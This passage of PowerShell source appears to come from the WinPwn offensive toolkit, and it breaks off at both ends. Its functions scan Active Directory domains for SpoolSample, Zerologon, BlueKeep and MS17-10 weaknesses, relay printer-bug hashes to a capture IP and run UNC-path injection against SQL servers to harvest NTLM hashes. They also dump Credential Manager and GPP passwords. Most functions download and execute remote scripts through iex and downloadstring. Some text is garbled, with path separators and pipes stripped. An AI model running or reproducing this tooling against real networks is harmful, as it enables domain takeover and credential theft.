                            Write-Host -ForegroundColor Yellow $FQDN hosts a Webserver over HTTPS but doesn't match the ADCS content, check that manually!
                        }
                    }
                    catch
                    {
                        Write-Host -ForegroundColor Yellow Not able to connect to $CertURI, maybe the current user is not authorized
                    }
                    $client.Close()

               }
            }
            
            
        }
        catch
        {
            Write-Host -ForegroundColor Yellow $FQDN cannot be resolved
        }
    }
}

function Domainshares
{
  @'

             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _

   -- DomainShares @S3cur3Th1sSh1t

'@
    do
    {
        Write-Host ================ WinPwn ================
        Write-Host -ForegroundColor Green '1. Passhunt search for Powerview found shares!'
        Write-Host -ForegroundColor Green '2. Run Snaffler! '
        Write-Host -ForegroundColor Green '3. Go back '
        Write-Host ================ WinPwn ================
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master'

        Switch ($masterquestion) 
        {
             1{passhunt -domain $true}
             2{Snaffler}
       }
    }
  While ($masterquestion -ne 3)

}

function Snaffler
{
    # @l0ss and @Sh3r4 - snaffler
    [CmdletBinding()]

    Param
    (   
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Snaffler.ps1')
    if (!$noninteractive)
    {
        Write-Host -ForegroundColor Yellow Get a copy of all found files to the loot folder
        $answer = Read-Host
      if ($othersystems -eq yes -or $othersystems -eq y -or $othersystems -eq Yes -or $othersystems -eq Y)
      {
        mkdir $currentPathLootFiles
              if(!$consoleoutput){Invoke-Snaffler -command -u -s -m $currentPathLootFiles -o $currentPathDomainReconSnaffler.txt}else{Invoke-Snaffler -command -u -s -m $currentPathLootFiles}
      }
      else
      {
        if(!$consoleoutput){Invoke-Snaffler -command -u -s -o $currentPathDomainReconSnaffler.txt}else{Invoke-Snaffler -command -u -s }
      }
    }
    else
    {
      Invoke-Snaffler -command -u
    }
}

function oxidresolver
{
    [CmdletBinding()]

    Param
    (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput
    )
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-OxidResolver.ps1')
    if(!$consoleoutput){pathcheck}
    if(!$consoleoutput){Invoke-Oxidresolver  $currentPathDomainReconOxidBindings.txt}
    else{Invoke-Oxidresolver}

}

function Spoolvulnscan
{
    #leechristensens Spoolsample scanner & Exploitation

    [CmdletBinding()]

    Param
    (   
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $exploit,
        [String]
        $captureIP

    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if (!$exploit)
    {   
        IEX ($viewdevobfs)         
      Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service!' #httpswww.slideshare.netharmj0yderbycon-the-unintended-risks-of-trusting-active-directory
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'SpoolerScannermasterSpoolerScan.ps1')
        $domcontrols = spinster
        
        
        foreach ($domc in $domcontrols.IPAddress)
        {
            if(!$consoleoutput){$domc  $currentPathDomainReconDC-IPs.txt}
        try{
                   if (spoolscan -target $domc)
                   {
                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now  or maybe NTLMv1 downgrade (httpsgist.github.comS3cur3Th1sSh1t0c017018c2000b1d5eddf2d6a194b7bb)'
                            if(!$consoleoutput){echo $domc  $currentPathVulnerabilitiesMS-RPNVulnerableDC.txt}else{Write-Host -ForegroundColor Red $domc is vulnerable}
                   }
         }
               catch
               {
                    Write-Host Got an error
               }
        }
        $othersystems = no
    if (!$noninteractive)
        {
            $othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain (yesno)'
        }
        if ($othersystems -eq yes -or $othersystems -eq y -or $othersystems -eq Yes -or $othersystems -eq Y)
        {
          Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem Windows Server
          foreach ($acserver in $ActiveServers.dnshostname)
                {
            try{
                          if (spoolscan -target $acserver)
                          {
                                Write-Host -ForegroundColor Yellow Found vulnerable Server - $acserver. You can take the Computer-Account Hash for SMB-Relay attacks  or maybe NTLMv1 downgrade (httpsgist.github.comS3cur3Th1sSh1t0c017018c2000b1d5eddf2d6a194b7bb)
                                if(!$consoleoutput){echo $acserver  $currentPathVulnerabilitiesMS-RPNVulnerableServers.txt}else{Write-Host $acserver is vulnerable;$servers += $acserver}
                          }
                }catch{Write-Host Got an error}
                }
        }
        if (!$noninteractive)
        {
             Write-Host -ForegroundColor Yellow Relay hashes from all vulnerable servers
             $answer = Read-Host
        }
        else
        {$answer = no}
    }
    if ($exploit){$answer = yes}
    if ($answer -eq yes -or $answer -eq y -or $answer -eq Yes -or $answer -eq Y)
    {
              if (($captureIP -eq ) -and ($noninteractive))
              {
                Write-Host -ForegroundColor Yellow You have to specify an hash capturing IP-Adress via -captureIP parameter!
      return
              }
              elseif($captureIP -eq )
              {
                 Write-Host -ForegroundColor Yellow Please enter the hash capturing IP-Adress
                 $captureIP = Read-Host
              }
              IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Spoolsample.ps1')
              if(!$consoleoutput)
              {
                if (test-path $currentPathVulnerabilitiesMS-RPNVulnerableDC.txt)
                {
                       $servers = get-content $currentPathVulnerabilitiesMS-RPNVulnerableDC.txt
                       foreach ($server in $servers)
                       {
                             Write-Host -ForegroundColor Yellow Spool sampling $server
                             Invoke-SpoolSample -command $server $captureip
                       }
                }
                if (test-path $currentPathVulnerabilitiesMS-RPNVulnerableServers.txt)
                {
                   $servers = get-content $currentPathVulnerabilitiesMS-RPNVulnerableServers.txt
                    foreach ($server in $servers)
                    {
                         Write-Host -ForegroundColor Yellow Spool sampling $server
                         Invoke-SpoolSample -command $server $captureip
                    }
                }
              }
              else
              {
                   foreach ($server in $servers)
                   {
                         Write-Host -ForegroundColor Yellow Spool sampling $server
                         Invoke-SpoolSample -command $server $captureip
                   }
              }
    }
}
                    

function GPORemoteAccessPolicy
{
    # Stolen from httpsgithub.comFSecureLABS
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-SharpGPO-RemoteAccessPolicies.ps1')
    if(!$consoleoutput){Invoke-SharpGPO-RemoteAccessPolicies  $currentPathDomainReconGPO-RemoteAccess.txt}else{Invoke-SharpGPO-RemoteAccessPolicies}
    if (($noninteractive) -and (!$consoleoutput))
    {
        Get-Content $currentPathDomainReconGPO-RemoteAccess.txt
        pause;
    }
}
function RBCD-Check
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Get-RBCD-Threaded.ps1')
    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]GetCurrentDomain().Name
    if(!$consoleoutput){Invoke-Get-RBCD-Threaded -Command -s -d $Domain  $currentPathDomainReconResourceBasedConstrainedDelegation-Check.txt}else{Invoke-Get-RBCD-Threaded -Command -s -d $Domain}
    if (($noninteractive) -and (!$consoleoutput))
    {
        Get-Content $currentPathDomainReconResourceBasedConstrainedDelegation-Check.txt
        pause;
    }
}

function Printercheck
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-SharpPrinter.ps1')
    if(!$consoleoutput){Invoke-SharpPrinter  $currentPathDomainReconprintercheck.txt}else{Invoke-SharpPrinter}
    if($noninteractive -and (!$consoleoutput)){
        Get-Content $currentPathDomainReconprintercheck.txt
        pause;
    }
}
function GPOAudit
{
  #
        .DESCRIPTION
        Check Group Policies for common misconfigurations using Grouper2 from l0ss.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Domain Recon
        [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )

    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    # todo interactive + consoleoutput
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Grouper2.ps1')
    Invoke-Grouper2 -command -i 4 -f $currentPathDomainReconGPOAudit.html
}


function reconAD
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )

    # sense-of-security - ADRecon
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    # todo interactive
    Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script'
    Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsADRecon.ps1') -Outfile $currentPathDomainReconADreconrecon.ps1
    Write-Host -ForegroundColor Yellow 'Executing ADRecon Script'
    cmd c start powershell -Command {$currentPathDomainReconADreconrecon.ps1}
}

function Bluekeep
{
  #
        .DESCRIPTION
        Search AD for pingable Windows servers and Check if they are vulnerable to bluekeep. Original script by httpsgithub.comvletoux @Pingcastle
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Domain Recon  Lateral Movement  Exploitation Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )

    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    IEX (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsbluekeepscan.ps1')
    IEX ($viewdevobfs)
    $serversystems = yes
    if (!$noninteractive){$serversystems = Read-Host -Prompt 'Start Bluekeep Scan for Windows Servers only (alternatively we can scan all Windows 7 Clients) (yesno)'}
    if ($serversystems -eq yes -or $serversystems -eq y -or $serversystems -eq Yes -or $serversystems -eq Y)
    {
      if(Test-Path -Path $currentPathDomainReconWindows_Servers.txt)
        {
              Write-Host -ForegroundColor Yellow Found an existing Server list, using this one instead of generating a new one!
             $ActiveServers = Get-Content $currentPathDomainReconWindows_Servers.txt
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem Windows Server
            $ActiveServers = $ActiveServers.dnshostname
            if(!$consoleoutput){$ActiveServers  $currentPathDomainReconWindows_Servers.txt}
        }
      foreach ($acserver in $ActiveServers)
        {
      try{
          if (bluekeepscan -target $acserver)
                {
                  Write-Host -ForegroundColor Yellow 'Found vulnerable Server, putting it to .VUlnerabilitiesbluekeep_VulnerableServers.txt!'
                    if(!$consoleoutput){echo $acserver  $currentPathVulnerabilitiesbluekeep_VulnerableServers.txt}else{Write-Host -ForegroundColor red $acserver is vulnerable}
                }
      }catch{Write-Host Got an error}
        }
    }
    else
    {
        if(Test-Path -Path $currentPathDomainReconWindows_Systems.txt)
        {
            Write-Host -ForegroundColor Yellow Found an existing Windows system list, using this one instead of generating a new one!
            $ActiveServers = Get-Content $currentPathDomainReconWindows_Systems.txt
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem Windows
            $ActiveServers = $ActiveServers.dnshostname
            if(!$consoleoutput){$ActiveServers  $currentPathDomainReconWindows_Systems.txt}
        }
      foreach ($acserver in $ActiveServers)
            {
        try{
              if (bluekeepscan -target $acserver)
                    {
                      Write-Host -ForegroundColor Yellow Found vulnerable System - $acserver. Just Pwn it!
                        if(!$consoleoutput){echo $acserver  $currentPathVulnerabilitiesbluekeep_VulnerableSystems.txt}else{Write-Host -ForegroundColor Red $acserver is vulnerable}
                    }
        }catch{Write-Host Got an error}
        }
    }

}

function zerologon
{
  #
        .DESCRIPTION
        Search in AD for Zerologon vulnerable DCs
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    IEX ($viewdevobfs)         
  Write-Host -ForegroundColor Yellow 'Searching for zerologon vulnerable Domain Controllers - if vulnerable you can pwn everything in 5 minutes.' 
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsInvoke-Zerologon.ps1')
    $domcontrols = spinster
        
        
    foreach ($domc in $domcontrols.name)
    {
        if(!$consoleoutput){$domc  $currentPathDomainReconDC-FQDN.txt}
    try{


                $Results = Invoke-Zerologon -fqdn $domc

                if (!($Results -eq $null))
                {
                    Write-Host Found vulnerable DC  
                    $domc
                    if(!$consoleoutput){$domc  $currentPathVulnerabilitiesZerologonvulnerableDC.txt}

                }
         }
           catch
           {
                Write-Host Got an error
           }
    }

}

function MS17-10
{
  #
        .DESCRIPTION
        Search in AD for pingable Windows servers and Check if they are vulnerable to MS17-10. Original script by httpsgithub.comvletoux @PingCastle
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Domain Recon  Lateral Movement  Exploitation Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    IEX (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsms17-10.ps1')
    IEX ($viewdevobfs)
    $serversystems = yes
    if(!$noninteractive)
    {
        $serversystems = Read-Host -Prompt 'Start MS17-10 Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while) (yesno)'
    }
    if ($serversystems -eq yes -or $serversystems -eq y -or $serversystems -eq Yes -or $serversystems -eq Y)
    {
      if(Test-Path -Path $currentPathDomainReconWindows_Servers.txt)
        {
            Write-Host -ForegroundColor Yellow Found an existing Server list, using this one instead of generating a new one!
            $ActiveServers = Get-Content $currentPathDomainReconWindows_Servers.txt
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem Windows Server
            $ActiveServers = $ActiveServers.dnshostname
            if(!$consoleoutput){$ActiveServers  $currentPathDomainReconWindows_Servers.txt}
        }
    foreach ($acserver in $ActiveServers)
        {
      try{
          if (Scan-MS17-10 -target $acserver)
                {
                  Write-Host -ForegroundColor Yellow Found vulnerable Server - $acserver. Just Pwn this system!
                    if(!$consoleoutput){echo $acserver  $currentPathVulnerabilitiesMS17-10_VulnerableServers.txt}else{Write-Host -ForegroundColor Red $acserver is vulnerable to MS17-10!}
                }
      }catch{Write-Host Got an error}
        }
    }
    else
    {
        if(Test-Path -Path $currentPathDomainReconWindows_Systems.txt)
        {
            Write-Host -ForegroundColor Yellow Found an existing Windows system list, using this one instead of generating a new one!
            $ActiveServers = Get-Content $currentPathDomainReconWindows_Systems.txt
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem Windows
            $ActiveServers = $ActiveServers.dnshostname
            if(!$consoleoutput){$ActiveServers  $currentPathDomainReconWindows_Systems.txt}
        }
    foreach ($acserver in $ActiveServers)
        {
      try{
          if (Scan-MS17-10 -target $acserver)
                {
                  Write-Host -ForegroundColor Yellow 'Found vulnerable System - $acserver. Just Pwn it!'
                    if(!$consoleoutput){echo $acserver  $currentPathVulnerabilitiesMS17-10_VulnerableSystems.txt}else{Write-Host -ForegroundColor Red $acserver is vulnerable to MS17-10!}
                }
      }catch{Write-Host Got an error}
        }
    }

}

function PowerSQL
{
  #
        .DESCRIPTION
        AD-Search for SQL-Servers. Login for current user tests. Default Credential Testing, UNC-PATH Injection SMB Hash extraction. Original Scipt from httpsgithub.comNetSPI
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    Write-Host -ForegroundColor Yellow 'Searching for SQL Server instances in the domain'
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsPowerUpSQL.ps1')
    if(!$consoleoutput){Get-SQLInstanceDomain -Verbose  $currentPathDomainReconSQLServers.txt}
    
    Write-Host -ForegroundColor Yellow 'Checking login with the current user Account'
    $Targets = Get-SQLInstanceDomain -Verbose  Get-SQLConnectionTestThreaded -Verbose -Threads 10  Where-Object {$_.Status -like Accessible} 
    if(!$consoleoutput){$Targets  $currentPathDomainReconSQLServer_Accessible.txt}else{Write-Host -ForegroundColor Yellow '------- Accessible SQL Servers';$Targets}
    if(!$consoleoutput){$Targets.Instance  $currentPathDomainReconSQLServer_AccessibleInstances.txt}else{Write-Host -ForegroundColor Yellow '------- Accessible Instances';$Targets.Instance}
    
    Write-Host -ForegroundColor Yellow 'Checking Default Credentials for all Instances'
    if(!$consoleoutput){Get-SQLInstanceDomain  Get-SQLServerLoginDefaultPw -Verbose  $currentPathVulnerabilitiesSQLServer_DefaultLogin.txt}else{Write-Host -ForegroundColor Yellow '------- Default Logins';Get-SQLInstanceDomain  Get-SQLServerLoginDefaultPw -Verbose}
    
    Write-Host -ForegroundColor Yellow 'Dumping Information and Auditing all accesible Databases'
    foreach ($line in $Targets.Instance)
    {
        if(!$consoleoutput){
            Get-SQLServerInfo -Verbose -Instance $line  $currentPathDomainReconSQLServer_Accessible_GeneralInformation.txt
            Invoke-SQLDumpInfo -Verbose -Instance $line $line  $currentPathDomainReconSQLServer_Accessible_DumpInformation.txt
          $SQLComputerName = $Targets.Computername
            Invoke-SQLAudit -Verbose -Instance $line  $currentPathVulnerabilitiesSQLServer_Accessible_Audit_$SQLComputerName.txt
          Get-SQLServerLinkCrawl -verbose -instance $line  $currentPathVulnerabilitiesSQLServerLinks_Pot_LateralMovement.txt
            mkdir $currentPathDomainReconSQLInfoDumps
            $Targets  Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword password,pass,credit,ssn,pwd -SampleSize 2 -ValidateCC -NoDefaults  $currentPathDomainReconSQLServer_Accessible_PotentialSensitiveData.txt 
        }
        else
        {
            Write-Host -ForegroundColor Yellow '------- SQL Login Info'
            Get-SQLServerInfo -Verbose -Instance $line
            Invoke-SQLDumpInfo -Verbose -Instance $line
          $SQLComputerName = $Targets.Computername
            Write-Host -ForegroundColor Yellow '------- SQL Audit'
            Invoke-SQLAudit -Verbose -Instance $line 
            Write-Host -ForegroundColor Yellow '------- Potential Lateral Movement over LinkCrawl'
          Get-SQLServerLinkCrawl -verbose -instance $line
        }
    }
    if(!$consoleoutput){
        Write-Host -ForegroundColor Yellow 'Moving CSV-Files to SQLInfoDumps folder'
        move .csv $currentPathDomainReconSQLInfoDumps
        $uncpath = no
        if (!$noninteractive){$uncpath = Read-Host -Prompt 'Execute UNC-Path Injection tests for accesible SQL Servers to gather some Netntlmv2 Hashes (yesno)'}
        if ($uncpath -eq yes -or $uncpath -eq y -or $uncpath -eq Yes -or $uncpath -eq Y)
        {
            $responder = Read-Host -Prompt 'Do you have Responder.py running on another machine in this network (If not we can start inveigh) - (yesno)'
            if ($responder -eq yes -or $responder -eq y -or $responder -eq Yes -or $responder -eq Y)
            {
                $smbip = Read-Host -Prompt 'Please enter the IP-Address of the hash capturing Network Interface'
              Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip
            }
            else
            {
                $smbip = Get-currentIP
                Inveigh
              Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip.IPv4Address.IPAddress
            }    
        }
    }
    #TODO Else Exploit Function
    # XP_Cmdshell functions follow - maybe.
	      
}

function Get-currentIP
{
  #
        .DESCRIPTION
        Gets the current active IP-Address configuration.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Domain Recon  Lateral Movement Phase
    $IPaddress = Get-NetIPConfiguration  Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne Disconnected}
    return $IPaddress
}

function SharpHoundMenu
{
  @'

             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _

   -- SharpHoundMenu

'@
    do
    {
        Write-Host ================ WinPwn ================
        Write-Host -ForegroundColor Green '1. Run SharpHound for the current domain!'
        Write-Host -ForegroundColor Green '2. Run SharpHound for another domain! '
        Write-Host -ForegroundColor Green '3. Run SharpHound for all trusted domains! '
        Write-Host -ForegroundColor Green '4. Go back '
        Write-Host ================ WinPwn ================
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master'

        Switch ($masterquestion) 
        {
             1{Sharphound -noninteractive}
             2{SharpHound}
             3{SharpHound -alltrustedomains}
       }
    }
  While ($masterquestion -ne 4)

}

function Sharphound
{
  #
        .DESCRIPTION
        Downloads Sharphound.exe and collects All AD-Information for Bloodhound httpsgithub.comBloodHoundAD
        Author @S3cur3Th1sSh1t, @Luemmelsec
        License BSD 3-Clause
    #
    #Domain Recon  Lateral Movement Phase
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $alltrustedomains   
    )

    
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-SharpHound4.ps1')
    Write-Host -ForegroundColor Yellow 'Running Sharphound Collector '
    
    if ($noninteractive)
    {
        Invoke-Sharphound4 -command -c All,GPOLocalGroup --OutputDirectory $currentPath
    }
    elseif($alltrustedomains)
    {
        IEX($admodule)
        $TrustedDomains = (Get-ADForest).Domains
        foreach ($TrustedDomain in $TrustedDomains)
        {
            Invoke-Sharphound4 -command -c All,GPOLocalGroup -d $TrustedDomain --ZipFileName $TrustedDomain.zip --OutputDirectory $currentPath
        }
        
    }
    else
    {
        $otherdomain = Read-Host -Prompt 'Pleas enter the domain to collect data from '
        Invoke-Sharphound4 -command -c All,GPOLocalGroup -d $otherdomain --OutputDirectory $currentPath
    }
}

function oldchecks
{
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    # Sherlock script, P0werUp Scipt, Get-GPP Scripts from p0werspl0it + credential manager dump
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpslocksher.ps1')
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterobfuscatedpsUpPower.ps1')
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterobfuscatedpsGPpass.ps1')
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterobfuscatedpsAutoGP.ps1')
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterobfuscatedpsDumpWCM.ps1')
    if(!$consoleoutput){
        Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager'
        Invoke-WCMDump  $currentPathExploitationWCMCredentials.txt
        if(Test-Path $currentPathExploitationWCMCredentials.txt){ $out = Get-Content $currentPathExploitationWCMCredentials.txt; $out}

        Write-Host -ForegroundColor Yellow 'Getting Local Privilege Escalation possibilities'

        Write-Host -ForegroundColor Yellow 'Getting GPPPasswords'
        amazon  $currentPathVulnerabilitiesGPP_Auto.txt
        if(Test-Path $currentPathVulnerabilitiesGPP_Auto.txt){ $out = Get-Content $currentPathVulnerabilitiesGPP_Auto.txt; $out}
        Shockley  $currentPathVulnerabilitiesGPP_Passwords.txt
        if(Test-Path $currentPathVulnerabilitiesGPP_Passwords.txt){ $out = Get-Content $currentPathVulnerabilitiesGPP_Passwords.txt; $out}

        Write-Host -ForegroundColor Yellow 'Looking for Local Privilege Escalation possibilities'
        try{    
        families  $currentPathLocalPrivEscAll_Localchecks.txt
        $out = Get-Content $currentPathLocalPrivEscAll_Localchecks.txt; $out}
        catch{}

        Write-Host -ForegroundColor Yellow 'Looking for MS-Exploits on this local system for Privesc'
        try{
        proportioned  $currentPathVulnerabilitiesSherlock_Vulns.txt
        if(Test-Path $currentPathVulnerabilitiesSherlock_Vulns.txt){ $out = Get-Content $currentPathVulnerabilitiesSherlock_Vulns.txt; $out}}
        catch{}
    }
    else
    {
        Write-Host -ForegroundColor Yellow '------- WCMDump'
        Invoke-WCMDump
        Write-Host -ForegroundColor Yellow '------- Getting Local Privilege Escalation possibilities'

        Write-Host -ForegroundColor Yellow '------- Getting GPPPasswords'
        amazon 
        Shockley 
        
        Write-Host -ForegroundColor Yellow '------- Looking for Local Privilege Escalation possibilities'
        try{    
        families
        } 
        catch{}

        Write-Host -ForegroundColor Yellow '------- Looking for MS-Exploits on this local system for Privesc'
        try{
        proportioned
        }catch{}

    }
}

function itm4nprivesc
{
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    # Stolen and obfuscated from httpsgithub.comitm4nPrivescCheck
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterobfuscatedpsInvoke-Privesc.ps1')
    if(!$consoleoutput)
    {
        Invoke-PrivescCheck -Extended -Report PrivescCheck -Format CSV,HTML,TXT
        Move-Item $currentPathPrivescCheck $currentPathLocalPrivEsc
    }
    else
    {
        Write-Host -ForegroundColor Yellow '------- Invoke-Privesc Checks'
        Invoke-PrivescCheck -Extended
    }
}

function otherchecks
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    
    $groups = 'Users,Everyone,Authenticated Users'
    $arguments = $groups.Split(,)
    $whoami = whoami
    
    if(!$consoleoutput){wmic qfe get InstalledOn  Sort-Object { $_ -as [datetime] }  Select -Last 1  $currentPathLocalPrivEscLastPatchDate.txt}else{Write-Host -ForegroundColor Yellow '------- Last Patch Date';wmic qfe get InstalledOn  Sort-Object { $_ -as [datetime] }  Select -Last 1}
    
    # Stolen somewhere.

    if(!$consoleoutput){

        Write Checking if SCCM is installed - installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading
        $result = $null
        $result = Get-WmiObject -Namespace rootccmclientSDK -Class CCM_Application -Property   select Name,SoftwareVersion
        if ($result) { $result  $currentPathLocalPrivEscSCCM_DLLSiteloading.txt }
        else { Write Not Installed. }
        
        Write Checking privileges - rotten potato
        $result = $null
        $result = (whoami priv  findstr i CSeImpersonatePrivilege CSeAssignPrimaryPrivilege CSeTcbPrivilege CSeBackupPrivilege CSeRestorePrivilege CSeCreateTokenPrivilege CSeLoadDriverPrivilege CSeTakeOwnershipPrivilege CSeDebugPrivilege 2 $null)  Out-String
        if ($result) { Write $result; $result  $currentPathLocalPrivEscRottenPotatoVulnerable.txt} else { Write User privileges do not allow for rotten potato exploit. }
        
        Write System32 directory permissions - backdoor windows binaries
        $result = $null
        $result = (Get-Acl CWindowssystem32).Access  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on CWindowssystem32 } } }
        if ($result -ne $null) { Write $result  Sort -Unique; $result  $currentPathLocalPrivEscSystem32directoryWritePermissions.txt } else { Write Permissions set on System32 directory are correct for all groups. }
        
        Write System32 files and directories permissions - backdoor windows binaries
        $result = $null
        $result = Get-ChildItem CWindowssystem32 -Recurse 2 $null  ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access }  ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('')[1]) { if ($_.FileSystemRights.tostring() -match AppendDataChangePermissionsCreateDirectoriesCreateFilesFullControlModifyTakeOwnershipWriteWriteData268435456-5368053761073741824 -and $_.IdentityReference.tostring() -like $arg) { $rights = $_.FileSystemRights.tostring(); Write Group $arg, Permissions $rights on $o } } }
        if ($result -ne $null) { Write $result  Sort -Unique; $result  $currentPathLocalPrivEscSystem32fileWritePermissions.txt } else { Write Permissions set on System32 files and directories are correct for all groups. }
        
        Write Program Files directory permissions - backdoor windows binaries
        $result = $null
